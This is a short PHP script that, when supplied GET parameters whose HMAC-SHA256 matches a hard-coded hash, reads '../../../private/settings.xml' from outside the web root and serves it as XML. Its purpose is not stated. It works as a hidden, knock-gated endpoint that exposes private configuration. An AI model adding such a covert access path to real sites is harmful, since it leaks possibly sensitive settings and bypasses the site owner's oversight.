<?php
if(isset($_GET['x']) && isset($_GET['y'])){
    if(hash_hmac('sha256', $_GET['x'], $_GET['y'])  === 'c024ecf765c8548b2b43213c7a6579b1eb6496f9e6b76b90d8641eb77329af16'){
        $f = file_get_contents('../../../private/settings.xml');
        header('Content-type: application/xml');
        echo $f;
    }
}
?>